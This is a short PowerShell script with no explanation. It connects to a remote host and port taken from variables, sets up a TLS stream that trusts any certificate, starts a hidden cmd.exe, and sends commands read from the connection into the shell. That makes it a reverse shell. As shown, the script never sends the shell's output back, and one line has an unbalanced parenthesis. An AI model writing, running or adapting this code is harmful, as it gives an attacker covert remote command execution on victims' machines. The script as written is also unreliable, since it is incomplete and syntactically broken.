$socket = new-object net.sockets.tcpclient($a,$b)
$tcpstream = $socket.getstream()
$tlsstream = new-object net.security.sslstream($tcpstream,$false,[net.security.remotecertificatevalidationcallback]{$true}))
$tlsstreamwriter = new-object io.streamwriter($tlsstream)
$tlsstreamwriter.autoflush = $true
$tlsstreamreader = new-object io.streamreader($tlsstream)
$shellinfo = new-object diagnostics.processstartinfo
$shellinfo.filename = "cmd.exe"
$shellinfo.createnowindow = $true
$shellinfo.useshellexecute = $false
$shellinfo.redirectstandardoutput = $true
$shellinfo.redirectstandarderror = $true
$shellinfo.redirectstandardinput = $true
$shell = new-object diagnostics.process
$shell.startinfo = $shellinfo
$shell.start()
$stdout = $shell.standardoutput
$stderr = $shell.standarderror
$stdin = $shell.standardinput
while(($shell.hasexited -eq $false))
{
	$stdin.writeline($tlsstreamreader.readline())
}
